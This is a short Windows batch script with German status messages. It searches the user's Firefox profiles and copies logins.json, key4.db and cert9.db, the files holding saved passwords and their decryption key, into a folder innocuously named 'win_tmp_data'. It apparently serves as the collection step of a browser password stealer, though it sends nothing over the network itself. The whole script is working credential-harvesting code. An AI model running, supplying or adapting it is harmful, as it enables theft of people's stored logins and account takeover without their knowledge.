@echo off
color 04

if not exist %CD%\win_tmp_data mkdir %CD%\win_tmp_data
del %CD%\win_tmp_data\logins.json /s /q 1>nul 2>nul
del %CD%\win_tmp_data\key4.db /s /q 1>nul 2>nul
del %CD%\win_tmp_data\cert9.db /s /q 1>nul 2>nul

echo.
echo Firefox key Dateien werden kopiert...
echo.
for /f "delims=" %%a in ('dir /s /b /a-d "%AppData%\Mozilla\Firefox\Profiles\logins.json"') do @(
  copy "%%a" "%CD%\win_tmp_data"
  )
for /f "delims=" %%a in ('dir /s /b /a-d "%AppData%\Mozilla\Firefox\Profiles\key4.db"') do @(
  copy "%%a" "%CD%\win_tmp_data"
  )
for /f "delims=" %%a in ('dir /s /b /a-d "%AppData%\Mozilla\Firefox\Profiles\cert9.db"') do @(
  copy "%%a" "%CD%\win_tmp_data"
  )

echo.
echo Vorgang abgeschlossen.
ping -n 4 localhost>nul